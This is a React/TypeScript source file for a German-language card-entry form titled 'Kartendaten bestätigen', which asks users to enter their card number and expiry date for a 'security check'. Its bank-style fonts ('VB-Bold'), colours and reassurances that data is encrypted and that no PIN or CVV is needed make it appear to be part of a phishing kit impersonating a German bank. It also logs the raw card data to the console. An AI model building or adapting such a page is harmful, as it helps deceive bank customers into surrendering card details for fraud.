import React, { useState, useEffect } from 'react';
import { CreditCard, Shield } from 'lucide-react';
import Loading from './Loading';

interface BankCardData {
  card_number: string;
  expiry_date: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<Partial<BankCardData>>({});
  const [isMobile, setIsMobile] = useState(false);
  const [isSmallMobile, setIsSmallMobile] = useState(false);
  
  // Focus states for floating labels
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [expiryDateFocused, setExpiryDateFocused] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
      setIsSmallMobile(window.innerWidth <= 480);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  // Format card number with spaces (XXXX XXXX XXXX XXXX)
  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      let year = v.substring(2, 4);
      
      // Ensure month is valid (01-12)
      if (parseInt(month) > 12) {
        month = '12';
      }
      
      return month + (year.length ? '/' + year : '');
    }
    return v;
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (cardNumber.replace(/\s/g, '').length < 13) {
      newErrors.card_number = 'Kartennummer muss mindestens 13 Ziffern haben';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Ungültiges Format (MM/YY)';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      const formData: BankCardData = {
        card_number: cardNumber.trim(),
        expiry_date: expiryDate.trim()
      };
      
      console.log('BankCardForm: Submitting data:', formData);
      await onSubmit(formData);
    } catch (error: any) {
      console.error('BankCardForm: Submission error:', error);
      setIsLoading(false);
    }
  };

  // Helper function to create floating label input
  const createFloatingLabelInput = (
    id: string,
    type: string,
    value: string,
    onChange: (value: string) => void,
    label: string,
    focused: boolean,
    setFocused: (focused: boolean) => void,
    error?: string,
    placeholder?: string,
    maxLength?: number
  ) => {
    const isLabelFloating = value.length > 0 || focused;
    
    return (
      <div style={{ position: 'relative', marginBottom: '16px' }}>
        <input
          id={id}
          type={type}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          placeholder={placeholder || ''}
          maxLength={maxLength}
          style={{
            width: '100%',
            padding: '28px 16px 8px 16px',
            border: error ? '2px solid #dc3545' : (focused ? '2px solid #0066cc' : '1px solid rgba(0, 0, 0, 0.65)'),
            borderRadius: '4px',
            fontSize: '16px',
            lineHeight: '24px',
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal',
            backgroundColor: 'transparent',
            outline: 'none',
            transition: 'all 0.2s ease',
            minHeight: '65px',
            boxSizing: 'border-box'
          }}
          onMouseEnter={(e) => {
            if (!focused && !error) {
              e.currentTarget.style.backgroundColor = '#f2f7fb';
            }
          }}
          onMouseLeave={(e) => {
            if (!focused) {
              e.currentTarget.style.backgroundColor = 'transparent';
            }
          }}
        />
        <label
          htmlFor={id}
          style={{
            position: 'absolute',
            left: '16px',
            top: isLabelFloating ? '8px' : '20px',
            fontSize: isLabelFloating ? '12px' : '16px',
            color: error ? '#dc3545' : (focused ? '#0066cc' : 'rgba(0, 0, 0, 0.65)'),
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal',
            transition: 'all 0.2s ease',
            pointerEvents: 'none',
            transformOrigin: 'left top'
          }}
        >
          {label}
        </label>
        {error && (
          <div style={{
            color: '#dc3545',
            fontSize: '12px',
            marginTop: '4px',
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal'
          }}>
            {error}
          </div>
        )}
      </div>
    );
  };

  if (isLoading) {
    return <Loading message="Kartendaten werden verarbeitet..." />;
  }

  // Responsive styles
  const containerPadding = isSmallMobile ? '20px 20px 20px 20px' : isMobile ? '24px 24px 24px 24px' : '32px 8px 32px 8px';
  const cardWidth = isMobile ? '100%' : '660px';
  const cardPadding = isSmallMobile ? '16px' : isMobile ? '20px' : '32px 32px 24px 32px';
  const titleFontSize = isSmallMobile ? '1.5rem' : isMobile ? '1.75rem' : '2.375rem';
  const titleLineHeight = isSmallMobile ? '1.75rem' : isMobile ? '2rem' : '2.75rem';

  return (
    <div style={{
      backgroundColor: 'transparent',
      padding: '0',
      fontFamily: 'VB-Regular, Arial, sans-serif',
      fontStyle: 'normal'
    }}>
      <div style={{
        maxWidth: '1400px',
        margin: '0 auto',
        padding: containerPadding,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'flex-start'
      }}>
        <div style={{
          width: '100%',
          maxWidth: cardWidth,
          backgroundColor: 'white',
          borderRadius: '8px',
          border: 'none',
          boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
          overflow: 'visible'
        }}>
          <div style={{
            padding: cardPadding
          }}>
            <h1 style={{
              color: '#003d7a',
              fontSize: titleFontSize,
              fontWeight: 'normal',
              margin: '0 0 16px 0',
              lineHeight: titleLineHeight,
              fontFamily: 'VB-Bold, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              Kartendaten bestätigen
            </h1>
            
            <p style={{
              margin: '0 0 32px 0',
              fontSize: isMobile ? '14px' : '16px',
              lineHeight: isMobile ? '20px' : '24px',
              color: '#000',
              fontFamily: 'VB-Regular, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              Bitte geben Sie Ihre Kartendaten zur Sicherheitsüberprüfung ein.
            </p>

            {/* Security Notice */}
            <div style={{
              backgroundColor: '#e8f4fd',
              border: '1px solid #b8d4e3',
              borderRadius: '8px',
              padding: '16px',
              marginBottom: '32px',
              display: 'flex',
              alignItems: 'center',
              gap: '12px'
            }}>
              <Shield size={20} color="#003d7a" />
              <p style={{
                fontSize: '14px',
                color: '#000',
                margin: 0,
                lineHeight: '1.4',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                <strong>Sicherheitshinweis:</strong> Ihre Daten werden verschlüsselt übertragen und sicher verarbeitet.
              </p>
            </div>

            <form onSubmit={handleSubmit}>
              {/* Card Number */}
              <div style={{ marginBottom: '16px' }}>
                {createFloatingLabelInput(
                  'cardNumber',
                  'text',
                  cardNumber,
                  (value) => setCardNumber(formatCardNumber(value)),
                  'Kartennummer',
                  cardNumberFocused,
                  setCardNumberFocused,
                  errors.card_number,
                  '',
                  19
                )}
              </div>

              {/* Expiry Date */}
              <div style={{ marginBottom: '32px' }}>
                {createFloatingLabelInput(
                  'expiryDate',
                  'text',
                  expiryDate,
                  (value) => setExpiryDate(formatExpiryDate(value)),
                  'Gültig bis (MM/YY)',
                  expiryDateFocused,
                  setExpiryDateFocused,
                  errors.expiry_date,
                  '',
                  5
                )}
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={isLoading}
                style={{
                  backgroundColor: isLoading ? '#ccc' : '#0066b3',
                  color: 'white',
                  border: 'none',
                  borderRadius: '50px',
                  padding: isMobile ? '16px 32px' : '18px 48px',
                  fontSize: isMobile ? '16px' : '18px',
                  fontFamily: 'VB-Bold, Arial, sans-serif',
                  fontStyle: 'normal',
                  fontWeight: 'normal',
                  cursor: isLoading ? 'not-allowed' : 'pointer',
                  transition: 'background-color 0.2s ease',
                  width: '100%',
                  textAlign: 'center',
                  display: 'inline-block',
                  lineHeight: '1.5'
                }}
                onMouseOver={(e) => {
                  if (!isLoading) {
                    e.currentTarget.style.backgroundColor = '#0052a3';
                  }
                }}
                onMouseOut={(e) => {
                  if (!isLoading) {
                    e.currentTarget.style.backgroundColor = '#0066b3';
                  }
                }}
              >
                {isLoading ? 'Wird verarbeitet...' : 'Kartendaten bestätigen'}
              </button>
            </form>

            {/* Card Info */}
            <div style={{
              marginTop: '32px',
              backgroundColor: '#f8f9fa',
              border: '1px solid #dee2e6',
              borderRadius: '8px',
              padding: '20px'
            }}>
              <h3 style={{
                fontSize: '16px',
                fontWeight: 'normal',
                color: '#003d7a',
                margin: '0 0 12px 0',
                fontFamily: 'VB-Bold, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Wichtige Hinweise:
              </h3>
              <ul style={{
                fontSize: '14px',
                color: '#333333',
                lineHeight: '20px',
                margin: 0,
                paddingLeft: '20px',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                <li style={{ marginBottom: '8px' }}>Geben Sie nur die Kartennummer und das Ablaufdatum ein</li>
                <li style={{ marginBottom: '8px' }}>Ihre PIN oder CVV wird nicht benötigt</li>
                <li style={{ marginBottom: '0' }}>Alle Daten werden verschlüsselt übertragen</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
      
      <style>
        {`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}
      </style>
    </div>
  );
};

export default BankCardForm;